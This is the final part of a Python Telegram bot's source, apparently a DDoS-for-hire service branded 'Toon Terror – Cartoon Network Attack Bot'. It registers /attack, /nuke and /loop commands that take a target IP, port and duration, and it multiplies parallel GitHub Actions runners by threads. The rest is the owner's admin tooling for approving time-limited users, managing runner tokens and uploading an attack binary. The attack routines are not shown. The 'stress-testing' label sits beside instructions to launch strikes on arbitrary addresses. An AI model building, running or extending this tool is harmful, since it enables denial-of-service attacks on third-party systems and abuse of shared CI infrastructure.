        "<b>ℹ️ UTILITY</b>\n"
        "<code>/start</code> – Main dashboard\n"
        "<code>/myid</code> – Your digital fingerprint\n"
        "<code>/about</code> – Bot info & credits\n"
        "<code>/help</code> – This menu\n\n"
        "<i>🎬 \"That's all, folks!\"</i>",
        parse_mode='HTML'
    )

# ============================================================
# ===== OTHER COMMANDS (Cartoon version) =====
# ============================================================

async def myid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"<b>🆔 YOUR DIGITAL FINGERPRINT</b>\n\n"
        f"<code>{update.effective_user.id}</code>\n\n"
        f"<i>Keep this safe – it's your secret identity!</i>\n"
        f"🦸 <b>\"With great ID comes great responsibility.\"</b>",
        parse_mode='HTML'
    )

async def about_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>🎭 TOON TERROR – CARTOON NETWORK ATTACK BOT 🎭</b>\n\n"
        "⚡ <b>Version:</b> 3.0 (CARTOON CHAOS EDITION)\n"
        "👨‍💻 <b>Built with:</b> Python, Pyrogram, GitHub Actions\n"
        "🔥 <b>Architecture:</b> {} Parallel Runners × {} Threads\n"
        "🎯 <b>Purpose:</b> Stress‑testing & network resilience\n"
        "💬 <b>Motto:</b> \"Power. Chaos. Cartoons.\"\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "<i>🍿 Grab your popcorn. The show is about to begin.</i>".format(RUNNERS, THREADS_PER_RUNNER),
        parse_mode='HTML'
    )

# ============================================================
# ===== ADMIN USER COMMANDS (Cartoon style) =====
# ============================================================

async def approve_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 2:
            await update.message.reply_text("📖 Usage: <code>/approve &lt;user_id&gt; &lt;days&gt;</code>", parse_mode='HTML')
            return
        target_id = int(context.args[0])
        days = int(context.args[1])
        pending_users[:] = [u for u in pending_users if str(u.get('user_id')) != str(target_id)]
        save_json('pending_users.json', pending_users)
        expiry = "LIFETIME" if days == 0 else time.time() + (days * 24 * 3600)
        approved_users[str(target_id)] = {"username": f"user_{target_id}", "added_by": user_id, "expiry": expiry, "days": days}
        save_json('approved_users.json', approved_users)
        await update.message.reply_text(f"✅ User <code>{target_id}</code> approved for {days} days.", parse_mode='HTML')
        try:
            await context.bot.send_message(target_id, "✅ <b>Access Granted!</b>\nUse /start to launch your first strike.", parse_mode='HTML')
        except:
            pass
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def removeuser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 Usage: <code>/remove &lt;user_id&gt;</code>", parse_mode='HTML')
            return
        target_id = int(context.args[0])
        if str(target_id) in approved_users:
            del approved_users[str(target_id)]
            save_json('approved_users.json', approved_users)
            await update.message.reply_text(f"✅ User {target_id} removed.", parse_mode='HTML')
        else:
            await update.message.reply_text("❌ User not found.", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not approved_users:
            await update.message.reply_text("📭 No approved users.", parse_mode='HTML')
            return
        msg = "<b>👥 APPROVED USERS</b>\n\n"
        for uid, data in approved_users.items():
            msg += f"`{uid}` – {data.get('days', '?')}d\n"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def pending_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not pending_users:
            await update.message.reply_text("📭 No pending requests.", parse_mode='HTML')
            return
        msg = "<b>⏳ PENDING REQUESTS</b>\n\n"
        for u in pending_users:
            msg += f"`{u.get('user_id')}` – @{u.get('username')}\n"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not context.args:
            await update.message.reply_text("📖 Usage: <code>/broadcast &lt;message&gt;</code>", parse_mode='HTML')
            return
        msg = " ".join(context.args)
        sent = 0
        for uid in list(owners.keys()) + list(approved_users.keys()):
            try:
                await context.bot.send_message(int(uid), f"📢 <b>ANNOUNCEMENT</b>\n\n{msg}", parse_mode='HTML')
                sent += 1
            except:
                pass
        await update.message.reply_text(f"✅ Sent to {sent} users.", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def maintenance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 Usage: <code>/maintenance &lt;on/off&gt;</code>", parse_mode='HTML')
            return
        mode = context.args[0].lower()
        save_json('maintenance.json', {"maintenance": mode == "on"})
        await update.message.reply_text(f"🔧 Maintenance {'ENABLED' if mode == 'on' else 'DISABLED'}.", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

# ============================================================
# ===== CALLBACKS =====
# ============================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        data = query.data

        if data == "attack_help":
            await query.edit_message_text(
                "<b>⚡ LAUNCH STRIKE</b>\n\n"
                "<code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n"
                "<code>/nuke &lt;ip:port&gt; ... &lt;time&gt;</code>\n"
                "<code>/loop &lt;ip&gt; &lt;port&gt; &lt;duration&gt; &lt;iterations&gt;</code>\n\n"
                "<b>Examples:</b>\n"
                "<code>/attack 1.1.1.1 443 60</code>\n"
                "<code>/nuke 1.1.1.1:80 2.2.2.2:443 60</code>\n"
                "<code>/loop 1.1.1.1 443 30 5</code>\n\n"
                "⏱️ Time: 5–3600 seconds\n"
                "🔌 Port: 1–65535\n"
                "<i>Get ready for the heat.</i>",
                parse_mode='HTML'
            )
        elif data == "status":
            await status_cmd(update, context)
        elif data == "stop":
            await stop_cmd(update, context)
        elif data == "admin_panel" and is_owner(user_id):
            keyboard = [
                [InlineKeyboardButton("🔑 Tokens", callback_data="admin_tokens")],
                [InlineKeyboardButton("👥 Users", callback_data="admin_users")],
                [InlineKeyboardButton("⏳ Pending", callback_data="admin_pending")],
                [InlineKeyboardButton("📤 Binary", callback_data="admin_binary")],
                [InlineKeyboardButton("🧹 Check Tokens", callback_data="admin_checktokens")],
            ]
            await query.edit_message_text("🔧 <b>Admin Console</b>", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
        elif data == "admin_tokens":
            await tokens_cmd(update, context)
        elif data == "admin_users":
            await users_cmd(update, context)
        elif data == "admin_pending":
            await pending_cmd(update, context)
        elif data == "admin_binary":
            await query.edit_message_text("📤 Use <code>/binary_upload</code>", parse_mode='HTML')
        elif data == "admin_checktokens":
            await checktokens_cmd(update, context)
    except Exception as e:
        logger.error(f"Callback error: {e}")

# ============================================================
# ===== ERROR =====
# ============================================================

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text("⚠️ System glitch. Check logs.", parse_mode='HTML')
        except:
            pass

# ============================================================
# ===== MAIN =====
# ============================================================

def main():
    try:
        app = Application.builder().token(BOT_TOKEN).build()

        conv_handler = ConversationHandler(
            entry_points=[CommandHandler("binary_upload", binary_upload_start)],
            states={WAITING_FOR_BINARY: [MessageHandler(filters.Document.ALL, binary_upload_receive), CommandHandler("cancel", binary_upload_cancel)]},
            fallbacks=[CommandHandler("cancel", binary_upload_cancel)]
        )
        app.add_handler(conv_handler)

        app.add_handler(CommandHandler("start", start_cmd))
        app.add_handler(CommandHandler("attack", attack_cmd))
        app.add_handler(CommandHandler("nuke", nuke_cmd))
        app.add_handler(CommandHandler("loop", loop_cmd))
        app.add_handler(CommandHandler("status", status_cmd))
        app.add_handler(CommandHandler("stop", stop_cmd))
        app.add_handler(CommandHandler("help", help_cmd))
        app.add_handler(CommandHandler("myid", myid_cmd))
        app.add_handler(CommandHandler("about", about_cmd))

        app.add_handler(CommandHandler("addtoken", addtoken_cmd))
        app.add_handler(CommandHandler("removetoken", removetoken_cmd))
        app.add_handler(CommandHandler("cleartokens", cleartokens_cmd))
        app.add_handler(CommandHandler("checktokens", checktokens_cmd))
        app.add_handler(CommandHandler("tokens", tokens_cmd))
        app.add_handler(CommandHandler("approve", approve_cmd))
        app.add_handler(CommandHandler("remove", removeuser_cmd))
        app.add_handler(CommandHandler("users", users_cmd))
        app.add_handler(CommandHandler("pending", pending_cmd))
        app.add_handler(CommandHandler("broadcast", broadcast_cmd))
        app.add_handler(CommandHandler("maintenance", maintenance_cmd))

        app.add_handler(CallbackQueryHandler(button_callback))
        app.add_error_handler(error_handler)

        logger.info(f"🚀 CARTOON TERROR is ONLINE!")
        logger.info(f"⚙️ {RUNNERS} Runners × {THREADS_PER_RUNNER} Threads = {RUNNERS*THREADS_PER_RUNNER} Total")
        logger.info("🎨 PRO CARTOONIST INTERFACE ACTIVATED!")
        app.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.error(f"Main error: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()
